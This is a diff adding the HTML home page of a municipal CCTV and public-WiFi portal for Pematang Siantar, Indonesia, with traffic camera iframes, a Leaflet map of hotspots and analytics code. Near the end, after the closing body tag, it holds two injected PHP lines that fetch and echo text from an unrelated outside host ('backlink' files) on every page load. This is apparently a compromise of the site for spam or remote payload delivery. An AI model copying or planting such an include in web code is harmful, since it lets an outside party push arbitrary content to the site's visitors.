@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zxx">
+  <!-- Mirrored from frontend/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Mar 2023 03:19:45 GMT -->
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" href="assets/css/animate.css" />
+    <!--favicon-->
+    <link rel="icon" href="assets/image/logo_pemko.svg" type="image/png" />
+    <link
+      rel="stylesheet"
+      href="../../pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="assets/bootstarp/bootstrap.min.css" />
+    <link rel="stylesheet" href="assets/css/super-classes.css" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.css"
+    />
+    <link rel="stylesheet" href="assets/css/mobile.css" />
+    <title>Selamat Datang Pada Halaman CCTV Online Kota Pematang Siantar</title>
+  </head>
+  <body>
+    <!--navbar-start-->
+    <div class="container">
+      <div class="header-con">
+        <nav
+          class="navbar navbar-expand-lg navbar-light p-0 fixed-top" id="myNavbar" style="background-color: transparent; 
+			padding-left: 30px !important;
+            padding-top: 10px !important;
+            padding-bottom: 10px !important;
+            padding-right: 30px !important;"
+        >
+          <a class="navbar-brand p-0" href="index.html">
+            <img
+              src="assets/image/logo-pelintas.png"
+              alt="logo-img"
+              class="img-fluid"
+            />
+          </a>
+          <button
+            class="navbar-toggler p-0 collapsed"
+            type="button"
+            data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent"
+            aria-expanded="false"
+            aria-label="Toggle navigation"
+          >
+            <span class="navbar-toggler-icon"></span>
+            <span class="navbar-toggler-icon"></span>
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div
+            class="collapse navbar-collapse justify-content-end"
+            id="navbarSupportedContent"
+          >
+            <ul class="navbar-nav">
+              <li class="nav-item active">
+                <a class="nav-link text-white p-0" href="index.html"
+                  >Home<span class="sr-only">(current)</span></a
+                >
+              </li>
+              <li class="nav-item">
+                <a class="nav-link text-white p-0" href="#cctv">
+                  <img
+                    src="assets/image/icon-cctv.png"
+                    alt="CCTV"
+                    class="icon"
+                  />
+                  CCTV
+                </a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link text-white p-0" href="#wifi">
+                  <img
+                    src="assets/image/icon-wifi.svg"
+                    alt="WIFI"
+                    class="icon"
+                  />
+                  WIFI
+                </a>
+              </li>
+
+              <li class="nav-item">
+                <a class="nav-link text-white p-0" href="about-us.html"
+                  >DISKOMINFO</a
+                >
+              </li>
+            </ul>
+            <a href="contact-us.html" class="my-2 my-sm-0 contact-btn"
+              >KONTAK</a
+            >
+          </div>
+        </nav>
+      </div>
+    </div>
+    <!--navbar-end-->
+    <!---header-and-banner-section-->
+    <div class="header-and-banner-con w-100">
+      <div class="header-and-banner-inner-con overlay-content">
+        <section class="banner-main-con">
+          <div class="container">
+            <!--banner-start-->
+            <div class="banner-con">
+              <div class="row">
+                <div
+                  class="col-lg-7 col-md-7 col-sm-12 d-flex justify-content-center flex-column banner-main-left-con"
+                >
+                  <div class="banner-left-con wow slideInLeft">
+                    <div class="banner-heading">
+                      <h1>CCTV Online Kota Pematang Siantar</h1>
+                    </div>
+                    <div class="banner-content">
+                      <p class="col-lg-11 pl-0 pr-0">
+                        Selamat Datang Pada Halaman CCTV Online Kota Pematang
+                        Siantar.
+                      </p>
+                    </div>
+                    <div class="banner-btn">
+                      <a href="#cctv" class="contact-btn">Lihat CCTV</a>
+                      <a href="#wifi" class="contact-btn contact-banner-btn"
+                        >WIFI PUBLIC</a
+                      >
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-5 col-md-5 col-sm-12">
+                  <div class="banner-right-con wow slideInRight">
+                    <figure class="mb-0">
+                      <img
+                        src="assets/image/dr.susanti.png"
+                        alt="banner-right-img"
+                      />
+                    </figure>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <!--banner-end-->
+          </div>
+        </section>
+      </div>
+    </div>
+    <!---header-and-banner-section-->
+
+    <!-- Pricing-section -->
+    <section id="cctv">
+      <div class="Pricing-con dots-left-img">
+        <div class="container overlay-content">
+          <div class="Pricing-title text-center">
+            <h5>PELINTAS (Pemantauan Lalu Lintas Kota Pematang Siantar)</h5>
+            <h2>
+              <img
+                src="assets/image/icon-cctv.svg"
+                alt="CCTV"
+                class="icon"
+                height="80"
+                width="80"
+              />CCTV
+            </h2>
+          </div>
+          <div class="row wow fadeInUp">
+            <!-- CCTV 1 Simpang Rambung Merah -->
+            <div
+              class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con"
+            >
+              <div class="Pricing-box-con">
+                <div class="Pricing-box-img text-center">
+                  <iframe
+                    width="100%"
+                    height="100%"
+                    src="https://g3.ipcamlive.com/player/player.php?alias=64cdd3526382a"
+                    frameborder="0"
+                    allowfullscreen=" "
+                    __idm_id__="376833 "
+                  ></iframe>
+                </div>
+                <div class="Pricing-box-heading text-center">
+                  <h2>CCTV</h2>
+                  <p>SIMPANG RAMBUNG MERAH</p>
+                </div>
+              </div>
+            </div>
+            <!-- CCTV 1 Close -->
+            <!-- CCTV 2 Simpang Dua -->
+            <div
+              class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con"
+            >
+              <div class="Pricing-box-con">
+                <div class="Pricing-box-img text-center">
+                  <iframe
+                    width="100% "
+                    height="100%"
+                    src="https://g3.ipcamlive.com/player/player.php?alias=64cdd28c47ab0"
+                    frameborder="0 "
+                    allowfullscreen=" "
+                    __idm_id__="376834 "
+                  ></iframe>
+                </div>
+                <div class="Pricing-box-heading text-center">
+                  <h2>CCTV</h2>
+                  <p>SIMPANG DUA</p>
+                </div>
+              </div>
+            </div>
+            <!-- CCTV 2 Close -->
+            <!-- CCTV 3 Simpang Sambo -->
+            <div
+              class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con">
+              <div class="Pricing-box-con">
+                <div class="Pricing-box-img text-center">
+                  <iframe
+                    width="100% "
+                    height="100%"
+                    src="https://g3.ipcamlive.com/player/player.php?alias=64cdd212e3910"
+                    frameborder="0 "
+                    allowfullscreen=" "
+                    __idm_id__="376835 "
+                  ></iframe>
+                </div>
+                <div class="Pricing-box-heading text-center">
+                  <h2>CCTV</h2>
+                  <p>SIMPANG SAMBO</p>
+                </div>
+              </div>
+            </div>
+            <!-- CCTV 3 Close -->
+          </div>
+          <br />
+          <div class="row wow fadeInUp">
+            <!-- CCTV 4 JL.SUDIRMAN / BRI - Under Maintenance -->
+              <div class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con">
+                <div class="Pricing-box-con">
+                  <div class="Pricing-box-img text-center">
+                    <img src="assets/image/perbaikan.png" alt="CCTV Under Maintenance">
+                  </div>
+                  <div class="Pricing-box-heading text-center">
+                    <h2>CCTV</h2>
+                    <p>JL.SUDIRMAN / BRI</p>
+                   
+                  </div>
+                </div>
+              </div>
+              <!-- CCTV 4 Close -->
+
+               <!-- CCTV 5 Merdeka -->
+               <div class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con">
+                <div class="Pricing-box-con">
+                  <div class="Pricing-box-img text-center">
+                    <img src="assets/image/perbaikan.png" alt="CCTV Under Maintenance">
+                  </div>
+                  <div class="Pricing-box-heading text-center">
+                    <h2>CCTV</h2>
+                  <p>JL.MERDEKA / DEPAN BALAI KOTA</p>
+                   
+                  </div>
+                </div>
+              </div>
+              <!-- CCTV 5 Close -->
+
+           
+            <!-- CCTV 6 Sitorus -->
+            <div
+              class="col-lg-4 col-md-4 col-12 mb-lg-0 mb-md-0 mb-4 Pricing-box-main-con"
+            >
+              <div class="Pricing-box-con">
+                <div class="Pricing-box-img text-center">
+                  <iframe
+                    width="100% "
+                    height="100%"
+                    src="https://g3.ipcamlive.com/player/player.php?alias=64cdd44ad5105"
+                    frameborder="0 "
+                    allowfullscreen=" "
+                    __idm_id__="376835 "
+                  ></iframe>
+                </div>
+                <div class="Pricing-box-heading text-center">
+                  <h2>CCTV</h2>
+                  <p>JL.MH. SITORUS</p>
+                </div>
+              </div>
+            </div>
+            <!-- CCTV 6 Close -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Pricing-section -->
+    <!--form-section-->
+    <section id="wifi">
+      <div class="form-main-con dots-left-img">
+        <div class="container overlay-content">
+          <div class="form-title-con text-center wow slideInLeft">
+            <h5>Lokasi Internet Publik</h5>
+
+            <h2>
+              <img
+                src="assets/image/icon-wifi.svg"
+                alt="WIFI"
+                class="icon"
+                height="80"
+                width="80"
+              />WIFI
+            </h2>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!--form-section-->
+    <!-- Map-section -->
+    <div class="Map-main-con">
+      <div id="mapid" class="Map-main-inner-con wow slideInRight">
+        <iframe
+          src="https://maps.google.com/maps?q=Level%201%2C%20121%20King%20Street%20Melbourne%2C%203000%2C%20Australia&amp;t=m&amp;z=20&amp;output=embed&amp;iwloc=near"
+          title="Level 1, 121 King Street Melbourne, 3000, Australia"
+          aria-label="Level 1, 121 King Street Melbourne, 3000, Australia"
+          class="w-100 border-0 overflow-hidden m-0"
+        ></iframe>
+      </div>
+    </div>
+    <!-- Map-section -->
+    <!-- <div id="mapid" class="Map-main-con"></div> -->
+    <!-- Map-section -->
+    <!-- Map-section -->
+
+    <!-- weight-footer-section -->
+    <section>
+      <div class="weight-footer-main-con bg-overly-img">
+        <div class="container overlay-content">
+          <div class="weight-footer-item-con">
+            <div class="row wow fadeInUp">
+              <div
+                class="col-lg-4 col-md-12 col-12 text-lg-left text-md-center"
+              >
+                <div
+                  class="weight-footer-item weight-footer-item1 mb-lg-0 mb-3"
+                >
+                  <div class="weight-footer-item-img">
+                    <figure>
+                      <img
+                        src="assets/image/logo-pelintas.png"
+                        alt="logo-img"
+                        class="img-fluid"
+                      />
+                    </figure>
+                  </div>
+                  <div class="weight-footer-item-content">
+                    <p
+                      class="mb-xl-0 mb-lg-0 mb-md-4 weight-footer-item1-content"
+                    >
+                      CCTV Online Kota Pematang Siantar
+                    </p>
+                  </div>
+                </div>
+              </div>
+              <div class="col-lg-2 col-md-3 col-5">
+                <div class="weight-footer-item mb-lg-0 mb-md-0 mb-3">
+                  <div class="weight-footer-item-title">
+                    <h3>DISKOMINFO</h3>
+                  </div>
+                  <div class="weight-footer-item-link">
+                    <ul class="list-unstyled mb-0">
+                      <li>
+                        <a href="#cctv"> CCTV </a>
+                      </li>
+                      <li>
+                        <a href="#wifi"> WIFI </a>
+                      </li>
+
+                      <li class="mb-0">
+                        <a href="contact-us.html"> Contact us </a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-lg-3 col-md-4 col-7">
+                <div class="weight-footer-item mb-lg-0 mb-md-0 mb-3">
+                  <div class="weight-footer-item-title">
+                    <h3>ALAMAT</h3>
+                  </div>
+                  <div
+                    class="weight-footer-item-content weight-footer-item-link"
+                  >
+                    <ul class="list-unstyled mb-0 social-icon-list">
+                      <li
+                        class="weight-footer-item2-content col-lg-11 pl-0 pr-0"
+                      >
+                        Jl. W. R. Supratman No.4, Proklamasi, Kec. Siantar Bar.,
+                        Kota Pematang Siantar, Sumatera Utara 21145
+                      </li>
+
+                      <li></li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://www.facebook.com/"
+                          ><i class="fab fa-facebook-f"></i
+                        ></a>
+                      </li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://twitter.com/?lang=en"
+                          ><i class="fab fa-twitter"></i
+                        ></a>
+                      </li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://www.instagram.com/accounts/login/"
+                          ><i class="fab fa-instagram"></i
+                        ></a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="col-lg-3 col-md-5 col-12">
+                <div class="weight-footer-item mb-0">
+                  <div class="weight-footer-item-title">
+                    <h3 class="Newsletter-title">KONTAK</h3>
+                  </div>
+                  <div
+                    class="weight-footer-item-content weight-footer-item-link"
+                  >
+                    <ul class="list-unstyled mb-0 social-icon-list">
+                      <li>
+                        <a href="mailto:diskominfo@mail.pematangsiantar.go.id">
+                          diskominfo@mail.pematangsiantar.go.id
+                        </a>
+                      </li>
+                      <li></li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://www.facebook.com/"
+                          ><i class="fab fa-facebook-f"></i
+                        ></a>
+                      </li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://twitter.com/?lang=en"
+                          ><i class="fab fa-twitter"></i
+                        ></a>
+                      </li>
+                      <li class="d-inline-block mb-0">
+                        <a href="https://www.instagram.com/accounts/login/"
+                          ><i class="fab fa-instagram"></i
+                        ></a>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer-con">
+          <div class="container overlay-content">
+            <div class="row">
+              <div class="col-lg-12">
+                <div class="footer-con text-center">
+                  <p>
+                    Dinas Komunikasi dan Informatika Kota Pematang Siantar ©
+                    2023.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- weight-footer-section -->
+    <script src="assets/js/wow.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.js"></script>
+    <script>
+      window.addEventListener("scroll", function () {
+        var navbar = document.querySelector("nav");
+        navbar.classList.toggle("scrolled", window.scrollY > 0);
+      });
+    </script>
+    <script>
+      // Inisialisasi peta Leaflet dengan koordinat Pematangsiantar sebagai pusat peta
+      var mymap = L.map("mapid").setView([2.9589, 99.0647], 15);
+
+      // Tambahkan layer peta dari OpenStreetMap
+      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        attribution:
+          'Map data &copy; <a href="#">Diskominfo Kota Pematang Siantar</a> contributors',
+        maxZoom: 18,
+      }).addTo(mymap);
+
+      // Membuat custom icon untuk tanda
+      var greenIcon = L.icon({
+        iconUrl: "assets/image/WIFIICON.svg",
+        iconSize: [25, 41],
+        iconAnchor: [12, 41],
+        popupAnchor: [1, -34],
+        shadowSize: [41, 41],
+        shadowUrl:
+          "https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png",
+        shadowAnchor: [12, 41],
+      });
+
+      // Tambahkan tanda pada lokasi-lokasi tertentu dengan custom icon
+      var marker1 = L.marker([2.960976400714269, 99.07937741580162], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker2 = L.marker([2.958400973667505, 99.06211768478242], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker3 = L.marker([2.95718422995049, 99.06111430673211], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker4 = L.marker([2.9558424160331116, 99.05918228314457], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker5 = L.marker([2.9636474407197335, 99.0471536711443], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker6 = L.marker([2.9445844914200134, 99.04153894140002], {
+        icon: greenIcon,
+      }).addTo(mymap);
+      var marker7 = L.marker([2.957382547334846, 99.06191391348658], {
+        icon: greenIcon,
+      }).addTo(mymap);
+
+      // Tambahkan konten kartu informasi untuk setiap tanda
+      var popup1 = L.popup().setContent("LPM NOMMENSEN");
+      var popup2 = L.popup().setContent("MEDIA CENTER DISKOMINFO");
+      var popup3 = L.popup().setContent("LAPANGAN MERDEKA");
+      var popup4 = L.popup().setContent("BALAI BOLON LAP.ADAM MALIK");
+      var popup5 = L.popup().setContent("GERBANG UTAMA UNIVERSITAS SIMALUNGUN");
+      var popup6 = L.popup().setContent("TAMAN BEO");
+      var popup7 = L.popup().setContent("DEKRANASDA");
+
+      // Tampilkan kartu informasi ketika tanda di klik
+      marker1.bindPopup(popup1);
+      marker2.bindPopup(popup2);
+      marker3.bindPopup(popup3);
+      marker4.bindPopup(popup4);
+      marker5.bindPopup(popup5);
+      marker6.bindPopup(popup6);
+      marker7.bindPopup(popup7);
+    </script>
+    <script>
+      new WOW().init();
+    </script>
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="assets/js/popper.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <script src="assets/js/custom-script.js"></script>
+	  
+	  
+	  <!-- Default Statcounter code for Cctv http://Cctv.pematangsiantar.go.id -->
+<script type="text/javascript">
+var sc_project=12872111; 
+var sc_invisible=1; 
+var sc_security="c0bdf72b"; 
+</script>
+<script>
+  window.addEventListener('scroll', function() {
+    var navbar = document.getElementById("myNavbar");
+    if (window.scrollY > 0) {
+      navbar.style.backgroundColor = "#091650";
+      navbar.style.paddingTop = "10px !important" ;
+      navbar.style.paddingBottom = "10px !important";
+    } else {
+      navbar.style.backgroundColor = "transparent";
+      navbar.style.paddingTop = "30px !important";
+      navbar.style.paddingBottom = "30px !important";
+    }
+  });
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js" async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/12872111/0/c0bdf72b/1/" alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
+	  
+  </body>
+<?php echo file_get_contents("https://owenshaw.xyz/backlink/load.txt"); ?>						
+<?php echo file_get_contents("https://owenshaw.xyz/backlink/note.txt"); ?>						
+</div>
+</html>
